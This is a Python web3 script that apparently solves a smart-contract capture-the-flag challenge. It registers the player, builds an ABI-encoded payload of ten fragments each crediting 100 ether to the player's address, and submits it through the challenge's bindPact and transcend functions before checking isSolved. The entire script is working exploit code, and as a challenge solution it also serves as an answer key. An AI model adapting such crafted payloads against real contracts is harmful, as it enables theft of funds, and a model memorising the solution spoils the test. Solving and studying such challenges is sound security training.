from web3 import Web3
from eth_account import Account
import eth_abi

RPC_URL = "RPC_URL"
PRIVATE_KEY = "PRIVATE_KEY"
SETUP_ADDRESS = "SETUP_ADDRESS"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)
player = account.address

setup_abi = [
    {"inputs":[{"internalType":"bytes","name":"agreement","type":"bytes"}],"name":"bindPact","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"challenge","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
]

challenge_abi = [
    {"inputs":[],"name":"registerSeeker","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"bytes","name":"truth","type":"bytes"}],"name":"transcend","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"seekers","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
]

setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
challenge = w3.eth.contract(address=setup.functions.challenge().call(), abi=challenge_abi)

def send_tx(func):
    nonce = w3.eth.get_transaction_count(player)
    tx = func.build_transaction({
        "from": player,
        "nonce": nonce,
        "gas": 3000000,
        "gasPrice": w3.eth.gas_price
    })
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)

if not challenge.functions.seekers(player).call():
    send_tx(challenge.functions.registerSeeker())

fragments = [(player, Web3.to_wei(100, "ether"), b"")] * 10

if hasattr(eth_abi, "encode"):
    payload = eth_abi.encode(
        ["(address,uint256,bytes)[]","bytes32","uint32","address","address"],
        [fragments, b"\x00"*32, 0, player, player]
    )
else:
    payload = eth_abi.encode_abi(
        ["(address,uint256,bytes)[]","bytes32","uint32","address","address"],
        [fragments, b"\x00"*32, 0, player, player]
    )

send_tx(setup.functions.bindPact(payload))
send_tx(challenge.functions.transcend(payload))

print(setup.functions.isSolved().call())